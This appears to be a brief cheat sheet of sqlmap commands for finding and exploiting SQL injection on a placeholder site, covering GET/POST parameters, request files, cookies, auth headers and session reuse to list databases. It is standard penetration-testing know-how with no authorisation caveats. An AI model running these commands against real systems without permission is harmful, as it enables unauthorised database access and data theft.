# SQLMAP HELP DESK 
## Simple Usage
If you don’t know anything about the target site then use the normal command first, Observe if the SQLMap found something juicy for you

```bash
sqlmap -u “https://target_site.com/page/”
```

## Automatic GET request parameter
```bash
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2”
```
## Specify the GET request parameters to Exploit
You can specify on which parameter you want to check or exploit the sql injection using just “-p” flag.
```bash
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2” -p p1
```
## Use POST requests (Test All parameters)
```bash
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2"
```
## SQLMap Request file as input
You can specify a request file containing the HTTP request, You can get it quickly from BurpSuite.

## sqlmap -r request.txt
Here you can specify the targeted parameter or sqlmap will recognize and will test for all the parameters found.

## Use Authenticated Session With Cookie
```bash
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"
```
## Use Authenticated Session with Auth Headers
```bash
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --headers="Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l"
```
## Basic Authentication
```bash
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --auth-type=basic --auth-cred=username:password
```
## Use Previously created Session as SQLmap input (-s)
If you got SQL injection positive somewhere, then sqlmap will automatically create a session file(.sqlite) for later use. Now, If you want to try some other commands later, you can use the session file directly (It will save your time to re-try all the possible payloads and identify the vulnerability and all.)
```bash
sqlmap -u “https://target_site.com/page?p1=value1" -s SESSION-FILE.sqlite --dbs
```
You can use this file from the home path of the SQLMap tool’s output directory.
